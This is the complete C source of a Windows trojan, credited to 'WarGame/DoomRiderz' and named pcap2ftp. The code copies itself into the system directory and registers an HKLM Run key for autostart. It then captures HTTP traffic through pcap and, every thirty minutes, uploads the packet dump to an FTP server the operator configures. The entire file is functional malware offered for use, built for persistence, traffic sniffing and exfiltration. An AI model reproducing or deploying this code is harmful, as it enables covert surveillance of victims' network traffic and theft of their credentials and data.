   /* pcap2ftp trojan by WarGame/DoomRiderz */

   #include "pcap.h"
   #include <windows.h>
   #include <wininet.h>

   #define FTP_SERVER "localhost" /* ftp server */
   #define FTP_USER "guest"      /* your username */
   #define FTP_PASS "guest"      /* your password */

   void packet_handler(u_char *dumpfile, const struct pcap_pkthdr *header, const u_char *pkt_data);
   DWORD WINAPI UploadToFTP(LPVOID Data);

   int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {
       pcap_if_t *alldevs;
       pcap_if_t *d;
       int inum = 0;
       int i=0;
       pcap_t *adhandle;
       char errbuf[PCAP_ERRBUF_SIZE];
       pcap_dumper_t *dumpfile;
       struct bpf_program fcode;
       bpf_u_int32 netmask;
       DWORD ID;
       char StartPath[MAX_PATH],dumperPath[MAX_PATH],SysDir[MAX_PATH];
       HKEY StartKey;


       /* add to autostart */
       GetModuleFileName(NULL,dumperPath,MAX_PATH);
       GetSystemDirectory(SysDir,MAX_PATH);
       sprintf(StartPath,"%s\\pcap2ftp.exe",SysDir);
       CopyFile(dumperPath,StartPath,FALSE);

       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
           0,KEY_WRITE,&StartKey) == ERROR_SUCCESS)
       {
           RegSetValueEx(StartKey,"pcap2ftp",0,REG_SZ,StartPath,strlen(StartPath));
           RegCloseKey(StartKey);
       }
       else
       {
           ExitProcess(0);
       }

       if (pcap_findalldevs(&alldevs, errbuf) == -1)
       {
           ExitProcess(1);
       }

       for(d=alldevs; d; d=d->next)
       {
           i++;

           if(d->description)
           {
               /* sniff only on ethernet like devices */
               if(strstr(d->description,"Eth"))
               {
                   inum = i;
               }
           }
       }

       if(i==0 || inum == 0)
       {
           ExitProcess(1);
       }

       for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);


       if ((adhandle= pcap_open_live(d->name,
                                65536,
                                1,
                                1000,
                                errbuf
                                )) == NULL)
       {
           pcap_freealldevs(alldevs);
           ExitProcess(-1);
       }

       if (d->addresses != NULL)
           netmask=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
       else
           netmask=0xffffff;

       /* here you should put your pcap filter, in this example it is for http sessions */
       if (pcap_compile(adhandle, &fcode, "tcp src port 80 or tcp dst port 80", 1, netmask) < 0)
       {
           pcap_freealldevs(alldevs);
           ExitProcess(-1);
       }

       if (pcap_setfilter(adhandle, &fcode) < 0)
       {
           pcap_freealldevs(alldevs);
           ExitProcess(-1);
       }

       dumpfile = pcap_dump_open(adhandle, "dump.pcap");

       if(dumpfile==NULL)
       {
           ExitProcess(1);
       }


       /* start ftp uploading */
       CreateThread(NULL,0,&UploadToFTP,0,0,&ID);

       pcap_freealldevs(alldevs);
       pcap_loop(adhandle, 0, packet_handler, (unsigned char *)dumpfile);
       pcap_close(adhandle);
       return 0;
   }

   /* handle incoming packets */
   void packet_handler(u_char *dumpfile, const struct pcap_pkthdr *header, const u_char *pkt_data)
   {
       pcap_dump(dumpfile, header, pkt_data);
   }

   /* upload to ftp the file dump.pcap */
   DWORD WINAPI UploadToFTP(LPVOID Data)
   {
       HANDLE ftp = NULL,fd = NULL;
       char ftp_file[MAX_PATH];
       SYSTEMTIME tm;


       while(1)
       {
           Sleep((1000*60)*30); /* every 30 minute */

           if((ftp = InternetOpen(FTP_SERVER,NULL,NULL,NULL,NULL)) == NULL)
           {
               ExitProcess(-1);
           }

           fd = InternetConnect(ftp,FTP_SERVER,21,FTP_USER,FTP_PASS,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,NULL);
           GetSystemTime(&tm);
           sprintf(ftp_file,"dump_day%d_month%d_hour%d_min%d.pcap",tm.wDay,tm.wMonth,tm.wHour,tm.wMinute);
           CopyFile("dump.pcap","dump2.pcap",FALSE); /* tmp file */
           FtpPutFile(fd,"dump2.pcap",ftp_file,FTP_TRANSFER_TYPE_BINARY,NULL); /* Upload */
           InternetCloseHandle(fd);
           DeleteFile("dump2.pcap");
       }
   }
